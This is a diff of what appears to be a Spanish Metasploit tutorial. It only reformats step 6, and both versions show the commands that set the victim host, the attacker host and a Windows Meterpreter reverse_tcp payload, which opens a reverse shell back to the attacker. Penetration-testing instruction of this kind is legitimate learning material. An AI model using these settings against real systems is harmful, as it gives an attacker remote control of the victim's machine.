@@ -50,11 +50,10 @@ Debes configurar:
 -	**PAYLOAD:** tipo de shell que quieres usar
 ________________________________________
 **🔹 6. Configurar los parámetros**
- ```bash
-set RHOST [IP_de_la_víctima]
-set LHOST [IP_de_Kali]
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
- ```
+<pre>set RHOST [IP víctima]</pre>
+<pre>set LHOST [IP atacante]</pre>
+<pre>set PAYLOAD windows/x64/meterpreter/reverse_tcp </pre>
+
 También puedes usar  ```bash windows/meterpreter/reverse_tcp  ``` si la víctima es de 32 bits.
 ________________________________________
 **🔹 7. Verificar configuración**
